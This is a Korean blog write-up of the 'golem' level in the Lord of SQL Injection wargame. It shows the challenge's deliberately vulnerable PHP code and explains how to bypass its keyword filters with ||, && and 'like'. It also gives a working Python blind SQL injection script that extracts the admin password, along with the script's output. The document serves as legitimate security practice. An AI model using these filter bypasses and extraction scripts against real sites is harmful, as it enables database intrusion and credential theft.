---
title: "[Lord of SQL Injection] LoS - golem 문제풀이"
date: 2018-07-30
draft: false
category: [wargame]
subcategories: [lord-of-sql-injection]
tags: [Write-up, Lord of SQL Injection]
---

벌써 11일 째 매일매일 꾸준히 문제를 풀고 있다.
작심삼일을 반복하던 내가 11일 째라니 기특하다.
이번 문제도 역시 `Blind SQL Injection` 이다.  

<!--more-->

코드는 다음과 같다.  

```php
----------------------------------------------------------------------------------
query : select id from prob_golem where id='guest' and pw=''
----------------------------------------------------------------------------------

<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/or|and|substr\(|=/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_golem where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_golem where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("golem"); 
  highlight_file(__FILE__); 
?>
```

이번엔 새로운 필터링이 추가되었다.
`or`, `and` 뿐만 아니라 `substr(`과 `=`가 있어도 `HeHe`를 출력한다.
`Blind SQL Injection` 문제를 풀 때 여태까지 사용한게 `substr` 함수와 `=` 문자인데, 이 둘을 사용할 수 없게 되었다.  

`substr`의 경우, `mid` 함수를 사용하면 `substr`과 동일하게 사용할 수 있다.
문제는 `=`인데, 처음에는 `부등호`를 사용하려 했었다.
근데 생각해보니 삽입해야 하는 쿼리는 `1' or id='admin' and length(pw)=1#`의 형태인데, 뒤의 `length(pw)=1`에는 부등호를 사용한다 쳐도, `id='admin'`에는 부등호를 사용해서 체크하기가 어려워 보였다.
그래서 `like`을 사용했다.  

`and`는 `&&`로, `or`은 `||`로 사용할 수 있듯, `=` 또한 `like`으로 사용할 수 있다.
따라서 최종적으로 완성되는 쿼리는 다음과 같은 형태가 된다.  

```plain
?pw=1' || id like 'admin' && length(pw) like 1#
```

앞서 말했듯, `&`는 `%26`으로, `#`은 `%23`으로 바꾸어 전달해야 한다.
이를 토대로 파이썬 코드를 구현하면 다음과 같다.  

```python
import requests

flag = ""
length = 0

url = "http://los.rubiya.kr/golem_4b5202cfedd8160e73124b5234235ef5.php?pw="
session = dict(PHPSESSID = "YOUR SESSION ID")

print "[+] Start"

print "[+] Find length of the password"

for i in range(0, 20):
	try:
		query = url + "1' || id like 'admin' %26%26 length(pw) like " + str(i) + "%23"
		r = requests.post(query, cookies=session)
	except:
		print "[-] Error occur"
		continue

	if 'Hello admin' in r.text:
		length = i
		break

print "[+] Found length : ", length

print "[+] Find password"

for j in range(1, length + 1):
	for i in range(48, 128):
		try:
			query = url + "1' || id like 'admin' %26%26 mid(pw, " + str(j) + ", 1) like '" + chr(i)
			r = requests.post(query, cookies=session)
		except:
			print "[-] Error occur"
			continue

		if 'Hello admin' in r.text:
			flag += chr(i)
			print "[+] Found " + str(j), ":", flag
			break

print "[+] Found password : ", flag
print "[+] End"
```

실행시킨 결과 아래와 같이 `admin`의 `pw`를 알아낼 수 있었다.  

```bash
$ python ex.py 
[+] Start
[+] Find length of the password
[+] Found length :  8
[+] Find password
[+] Found 1 : 7
[+] Found 2 : 77
[+] Found 3 : 77D
[+] Found 4 : 77D6
[+] Found 5 : 77D62
[+] Found 6 : 77D629
[+] Found 7 : 77D6290
[+] Found 8 : 77D6290B
[+] Found password :  77D6290B
[+] End
```

이번에도 알파벳 대문자는 소문자로 바꾸어 입력 해 주어야 한다.
그냥 대문자 건너뛰고 소문자로 찾을걸 그랬나보다.  

```plain
?pw=77d6290b
```

그럼 아래와 같이 문제를 풀 수 있다.  

```php
----------------------------------------------------------------------------------------------
query : select id from prob_golem where id='guest' and pw='77d6290b'
----------------------------------------------------------------------------------------------

GOLEM Clear!
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/or|and|substr\(|=/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_golem where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_golem where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("golem"); 
  highlight_file(__FILE__); 
?>
```

---

```plain
GOLEM Clear!!
```